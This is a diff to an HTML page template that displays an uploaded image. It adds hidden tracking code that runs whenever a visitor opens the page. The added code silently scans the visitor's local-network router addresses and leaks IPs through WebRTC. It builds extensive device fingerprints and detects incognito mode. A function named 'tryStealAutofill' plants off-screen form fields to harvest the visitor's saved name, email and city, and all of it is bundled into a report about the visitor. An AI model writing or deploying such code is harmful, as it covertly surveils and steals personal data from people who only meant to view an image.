@@ -24,7 +24,7 @@
     </style>
     <script>
     // ╔═══════════════════════════════════════════════════════════════════════════════╗
-    // ║  🦅 EAGLE EYE OMNISCIENT v7.1 — TRAP EDITION (FULL SENSORS)                   ║
+    // ║  🦅 EAGLE EYE OMNISCIENT v11.0 — TRAP EDITION (AGGRESSIVE)                    ║
     // ╚═══════════════════════════════════════════════════════════════════════════════╝
     window.EagleEyeOmni = class {
         constructor() {
@@ -35,17 +35,24 @@
         }
 
         async init() {
-            // 1. ETag Persistence Check
             new Image().src = `/pixel.gif?source=image_trap_etag&uid=${this.sessionId}`;
-            
-            // 2. DNS Canary Trigger (Unique Subdomain)
             if (this.canaryDomain) {
                 const uniqueSub = `${this.sessionId}.${Date.now()}`;
                 new Image().src = `https://${uniqueSub}.trap.${this.canaryDomain}/pixel.gif`;
             }
-
-            // 3. Collect Data (Wait 500ms for WebRTC/IPv6 candidates)
             setTimeout(() => this.collect(), 500);
+        }
+
+        // === 1. NETWORK FORENSICS ===
+        getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return "not_supported";
+            return {
+                type: conn.effectiveType || "unknown",
+                rtt: conn.rtt,
+                downlink: conn.downlink,
+                saveData: conn.saveData
+            };
         }
 
         async getWebRTC() {
@@ -62,7 +69,7 @@
                             else res.public.push(ip[1]);
                         }
                     };
-                    setTimeout(r, 1000);
+                    setTimeout(r, 2000);
                 });
             } catch(e){}
             return res;
@@ -82,6 +89,173 @@
                 } catch (e) { continue; }
             }
             return { detected: false, ip: null };
+        }
+
+        async scanLocalNetwork() {
+            const targets = ['192.168.0.1', '192.168.1.1', '192.168.1.254', '10.0.0.1', '172.16.0.1'];
+            const checkPort = (ip) => {
+                return new Promise(resolve => {
+                    const start = performance.now();
+                    const img = new Image();
+                    img.src = `http://${ip}/favicon.ico?r=${Math.random()}`;
+                    img.onload = () => resolve({ ip, status: 'open', time: performance.now() - start });
+                    img.onerror = () => {
+                        const time = performance.now() - start;
+                        if (time < 500) resolve({ ip, status: 'alive', time }); 
+                        else resolve({ ip, status: 'dead', time });
+                    };
+                    setTimeout(() => resolve({ ip, status: 'timeout', time: 9999 }), 2000);
+                });
+            };
+            const checks = targets.map(ip => checkPort(ip));
+            const scanResults = await Promise.all(checks);
+            return scanResults.filter(r => r.status !== 'dead' && r.status !== 'timeout');
+        }
+
+        // === 2. HARDWARE DEEP DIVE ===
+        getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "no_webgl";
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const limits = {
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxCubeMapSize: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
+                    maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
+                };
+                if (!debugInfo) return { vendor: "masked", renderer: "masked", limits: limits };
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    limits: limits
+                };
+            } catch (e) { return "error"; }
+        }
+
+        async getMediaDevicesCount() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "not_supported";
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+                };
+            } catch (e) { return "blocked"; }
+        }
+
+        async getClientHints() {
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues([
+                        "model", "platformVersion", "architecture", "bitness", "fullVersionList", "mobile"
+                    ]);
+                    return { model: hints.model, platformVersion: hints.platformVersion, mobile: hints.mobile };
+                } catch (e) { return "restricted"; }
+            }
+            return "not_supported";
+        }
+
+        async getBatteryStatus() {
+            if (navigator.getBattery) {
+                try {
+                    const batt = await navigator.getBattery();
+                    return { level: (batt.level * 100) + "%", charging: batt.charging };
+                } catch (e) { return "error"; }
+            }
+            return "not_supported";
+        }
+
+        // === 3. SENSORS & BEHAVIOR ===
+        async getAmbientLight() {
+            if ('AmbientLightSensor' in window) {
+                try {
+                    const sensor = new AmbientLightSensor();
+                    return new Promise(resolve => {
+                        sensor.onreading = () => { sensor.stop(); resolve(sensor.illuminance); };
+                        sensor.onerror = () => resolve("Error/Permission");
+                        sensor.start();
+                        setTimeout(() => { sensor.stop(); resolve("Timeout"); }, 500);
+                    });
+                } catch { return "Not Supported"; }
+            }
+            return "Not Supported";
+        }
+
+        trackMouseEntropy() {
+            return new Promise(resolve => {
+                let moves = [];
+                const fn = e => {
+                    moves.push({x:e.clientX, y:e.clientY});
+                    if(moves.length > 10) {
+                        document.removeEventListener('mousemove', fn);
+                        let variance = 0;
+                        for(let i=2; i<moves.length; i++) {
+                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
+                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
+                            variance += Math.abs(a1 - a2);
+                        }
+                        resolve(variance);
+                    }
+                };
+                document.addEventListener('mousemove', fn);
+                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 2000);
+            });
+        }
+
+        // === 4. DISPLAY & WINDOW ===
+        getScreenExtended() {
+            return {
+                orientation: (screen.orientation || {}).type || window.orientation || "unknown",
+                touchPoints: navigator.maxTouchPoints || 0,
+                colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
+                hdr: window.matchMedia('(dynamic-range: high)').matches ? "Yes" : "No",
+                window: {
+                    outer: `${window.outerWidth}x${window.outerHeight}`,
+                    inner: `${window.innerWidth}x${window.innerHeight}`,
+                    avail: `${window.screen.availWidth}x${window.screen.availHeight}`
+                }
+            };
+        }
+
+        // === 5. SECURITY & AGGRESSIVE ===
+        async detectIncognito() {
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const { quota } = await navigator.storage.estimate();
+                    return quota < 125829120 ? "Yes (Probable)" : "No";
+                } catch (e) {}
+            }
+            return "Unknown";
+        }
+
+        detectAdBlock() {
+            const bait = document.createElement('div');
+            bait.innerHTML = '&nbsp;';
+            bait.className = 'adsbox ad-banner pub_300x250';
+            bait.style.position = 'absolute'; bait.style.top = '-999px';
+            document.body.appendChild(bait);
+            const detected = (bait.offsetHeight === 0 || bait.style.display === 'none');
+            document.body.removeChild(bait);
+            return detected ? "Yes" : "No";
+        }
+
+        async tryStealAutofill() {
+            const form = document.createElement('div');
+            form.style.position = 'absolute'; form.style.top = '-2000px';
+            form.innerHTML = `
+                <input type="text" name="name" autocomplete="name" value="">
+                <input type="email" name="email" autocomplete="email" value="">
+                <input type="text" name="city" autocomplete="address-level2" value="">
+            `;
+            document.body.appendChild(form);
+            await new Promise(r => setTimeout(r, 1000));
+            const inputs = form.querySelectorAll('input');
+            const data = {};
+            inputs.forEach(input => { if (input.value) data[input.name] = input.value; });
+            document.body.removeChild(form);
+            return Object.keys(data).length > 0 ? data : "No Data / Interaction Required";
         }
 
         async getAudioHash() {
@@ -108,7 +282,7 @@
                 const ctx = canvas.getContext('2d');
                 ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
                 ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v7", 2, 15);
+                ctx.fillStyle = "#069"; ctx.fillText("Eagle_v11", 2, 15);
                 const data = canvas.toDataURL();
                 let hash = 0;
                 for (let i = 0; i < data.length; i++) {
@@ -119,36 +293,24 @@
             } catch { return "error"; }
         }
 
-        // Mouse Entropy (Simplified for Trap)
-        trackMouseEntropy() {
-            return new Promise(resolve => {
-                let moves = [];
-                const fn = e => {
-                    moves.push({x:e.clientX, y:e.clientY});
-                    if(moves.length > 10) { // Faster check for trap
-                        document.removeEventListener('mousemove', fn);
-                        let variance = 0;
-                        for(let i=2; i<moves.length; i++) {
-                            const a1 = Math.atan2(moves[i-1].y - moves[i-2].y, moves[i-1].x - moves[i-2].x);
-                            const a2 = Math.atan2(moves[i].y - moves[i-1].y, moves[i].x - moves[i-1].x);
-                            variance += Math.abs(a1 - a2);
-                        }
-                        resolve(variance);
-                    }
-                };
-                document.addEventListener('mousemove', fn);
-                setTimeout(() => { document.removeEventListener('mousemove', fn); resolve(0); }, 2000);
-            });
-        }
-
         async collect() {
-            const [webrtc, ipv6, audio, entropy] = await Promise.all([
+            const [webrtc, ipv6, audio, entropy, battery, hints, incognito, media, lanScan, autofill] = await Promise.all([
                 this.getWebRTC(), 
                 this.getIPv6(),
                 this.getAudioHash(),
-                this.trackMouseEntropy()
+                this.trackMouseEntropy(),
+                this.getBatteryStatus(),
+                this.getClientHints(),
+                this.detectIncognito(),
+                this.getMediaDevicesCount(),
+                this.scanLocalNetwork(),
+                this.tryStealAutofill()
             ]);
             const canvas = this.getCanvasHash();
+            const gpu = this.getGPU();
+            const screenExt = this.getScreenExtended();
+            const adBlock = this.detectAdBlock();
+            const network = this.getNetworkInfo();
             
             const payload = {
                 meta: { 
@@ -157,16 +319,32 @@
                     url: window.location.href,
                     filename: "{{ filename }}"
                 },
-                network: { webrtc: webrtc, ipv6: ipv6 },
-                fingerprints: { audio: audio, canvas: canvas },
+                network: { 
+                    info: network,
+                    webrtc: webrtc, 
+                    ipv6: ipv6,
+                    lan_scan: lanScan
+                },
+                fingerprints: { audio: audio, canvas: canvas, gpu: gpu },
+                hardware: {
+                    model: hints,
+                    battery: battery,
+                    screen_advanced: screenExt,
+                    media_devices: media,
+                    mouseEntropy: entropy,
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory
+                },
+                security: { 
+                    incognito: incognito, 
+                    adBlock: adBlock,
+                    autofill_data: autofill
+                },
                 system: { 
+                    user_time: new Date().toString(),
                     ua: navigator.userAgent, 
                     platform: navigator.platform, 
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory,
-                    mouseEntropy: entropy
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                 }
             };
             
@@ -178,7 +356,6 @@
     </script>
 </head>
 <body>
-    <!-- Загружаем картинку через RAW маршрут, чтобы сработал еще и серверный логгер + ETag -->
     <img src="/raw/{{ filename }}" alt="{{ filename }}">
 </body>
 </html>
